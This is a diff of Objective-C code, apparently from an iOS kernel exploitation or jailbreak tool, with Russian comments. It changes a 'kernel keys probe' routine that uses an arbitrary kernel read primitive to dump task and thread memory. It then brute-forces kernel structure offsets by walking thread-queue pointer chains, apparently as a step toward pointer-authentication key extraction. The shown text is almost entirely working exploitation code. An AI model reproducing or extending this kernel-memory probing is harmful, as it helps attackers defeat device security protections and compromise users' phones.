@@ -5055,20 +5055,33 @@ static void kpPacLive(NSString *line)
         pacnote(@"--- kernel keys probe ---");
         extern uint64_t task_self(void);
         uint64_t selfTask = task_self();
-        // self-calibrate (task.threads, thread.task_threads) на своём таске:
-        // ищем пару оффсетов, по которым очередь тредов содержит наш threadVA.
-        const uint32_t qcands[] = {0x58, 0x50, 0x60};
-        const uint32_t lcands[] = {0x3b0, 0x3d8, 0x3e0, 0x388, 0x380, 0x398};
+        pacnote([NSString stringWithFormat:@"  selfTask=%#llx selfThread=%#llx", selfTask, threadVA]);
+        // дамп для глаз: очередь тредов = два соседних heap-указателя в task,
+        // линк в thread_t = указатель обратно на очередь
+        NSMutableString *dumpT = [NSMutableString stringWithString:@"  task dump:"];
+        for (uint32_t o = 0x40; o <= 0xC0; o += 8)
+            [dumpT appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(selfTask + o)];
+        pacnote(dumpT);
+        NSMutableString *dumpTh = [NSMutableString stringWithString:@"  thread dump:"];
+        for (uint32_t o = 0x300; o <= 0x400; o += 8)
+            [dumpTh appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
+        pacnote(dumpTh);
+        // brute force по широкой сетке: очередь (heap-цепь ≥3 узлов), в которой
+        // встречается наш threadVA
         uint32_t taskQ = 0, linkQ = 0;
-        for (int ci = 0; ci < 3 && !taskQ; ci++) {
-            for (int li = 0; li < 6 && !taskQ; li++) {
-                uint64_t head = selfTask + qcands[ci];
+        for (uint32_t qc = 0x40; qc <= 0xC0 && !taskQ; qc += 8) {
+            for (uint32_t lc = 0x300; lc <= 0x400 && !taskQ; lc += 8) {
+                uint64_t head = selfTask + qc;
                 uint64_t cur = kp_untag_ptr(kp_rc_kread64(head));
-                for (int n = 0; n < 64 && cur && cur != head; n++) {
-                    if (cur - lcands[li] == threadVA) { taskQ = qcands[ci]; linkQ = lcands[li]; break; }
-                    if (!kpLooksLikeKernelPointer(cur)) break;
+                int chain = 0;
+                for (int n = 0; n < 96 && cur && cur != head; n++) {
+                    if (!kpLooksLikeKernelPointer(cur)) { chain = 0; break; }
+                    chain++;
+                    if (cur - lc == threadVA) { taskQ = qc; linkQ = lc; break; }
                     cur = kp_untag_ptr(kp_rc_kread64(cur));
                 }
+                if (chain >= 3 && !taskQ)
+                    pacnote([NSString stringWithFormat:@"  цепь из %d узлов при q=0x%x (но нашего треда нет при l=0x%x)", chain, qc, lc]);
             }
         }
         pacnote([NSString stringWithFormat:@"  self-calib: task.threads=0x%x link=0x%x %@", taskQ, linkQ,
